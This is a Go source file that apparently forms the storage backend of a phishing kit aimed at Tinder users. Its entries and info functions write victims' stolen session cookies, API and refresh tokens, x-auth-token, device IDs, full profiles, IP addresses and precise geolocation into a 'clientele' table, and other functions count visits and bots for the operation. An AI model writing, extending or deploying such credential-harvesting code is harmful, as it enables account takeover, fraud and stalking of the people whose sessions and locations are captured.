package core

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"time"

	_ "github.com/go-sql-driver/mysql"
)

func entries(sessionId, username, tindercookie1, tindercookie2, activetabkey, apitoken, persistentdeviceid, refreshtoken, configservice, uuid, ip, region, city, latitude, longitude, useragent string) error {

	db, err := conn("tdx")
	if err != nil {
		log.Printf("[tinder][err] Could not connect to db via tinder init for %s: %v", sessionId, err)
		return err
	}
	defer db.Close()

	_, err = db.Exec("INSERT INTO clientele (sessionId, tinder_username, tinder_cookie_1, tinder_cookie_2, active_tab_key, api_token, persistent_device_id, refresh_token, config_service, uuid, region, city, latitude, longitude, time_obtained, user_agent, remote_addr) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)", sessionId, username, tindercookie1, tindercookie2, activetabkey, apitoken, persistentdeviceid, refreshtoken, configservice, uuid, region, city, latitude, longitude, time.Now().Format("02/01/2006 15:04"), useragent, ip)
	if err != nil {
		log.Printf("[tinder][err] Could not insert db for %s: %s", sessionId, err.Error())
		return err
	}

	_, err = db.Exec("UPDATE analytics SET tinder = tinder + 1")
	if err != nil {
		log.Printf("[tinder][err] Could not update analytics: %v", err)
	}

	return nil

}

func info(sessionId, xauthtoken, appsessionid, usersessionid, persistentdeviceid string, profile Tinder) (bool, error) {

	db, err := conn("tdx")
	if err != nil {
		log.Printf("[tinder][err] Could not connect to db via tinder info for %s: %v", sessionId, err)
		return false, err
	}
	defer db.Close()

	tprofile, err := json.Marshal(profile)
	if err != nil {
		log.Printf("[tinder][err] Could not marshal profile to JSON for %s: %v", sessionId, err)
		return false, err
	}

	_, err = db.Exec("UPDATE clientele SET x_auth_token = ?, app_session_id = ?, user_session_id = ?, persistent_device_id = ?, tinder_profile = ? WHERE sessionId = ?", xauthtoken, appsessionid, usersessionid, persistentdeviceid, tprofile, sessionId)
	if err != nil {
		log.Printf("[tinder][err] Could not update db for %s: %s", sessionId, err.Error())
		return false, err
	}

	return true, err

}

func visitor() error {

	db, err := conn("tdx")
	if err != nil {
		log.Println("[tinder][err] Could not connect to db via tinder", err)
		return err
	}
	defer db.Close()

	_, err = db.Exec("UPDATE analytics SET visits = visits + 1")
	if err != nil {
		log.Printf("[tinder][err] Could not update analytics: %v", err)
	}

	return nil

}

func bots() error {

	db, err := conn("tdx")
	if err != nil {
		log.Println("[tinder][err] Could not connect to db via tinder", err)
		return err
	}
	defer db.Close()

	_, err = db.Exec("UPDATE analytics SET bots = bots + 1")
	if err != nil {
		log.Printf("[tinder][err] Could not update analytics: %v", err)
	}

	return nil

}

func conn(db string) (*sql.DB, error) {
	bin, err := os.ReadFile("/run/secrets/db-password")
	if err != nil {
		return nil, err
	}
	return sql.Open("mysql", fmt.Sprintf("root:%s@tcp(db:3306)/%s", string(bin), db))
}
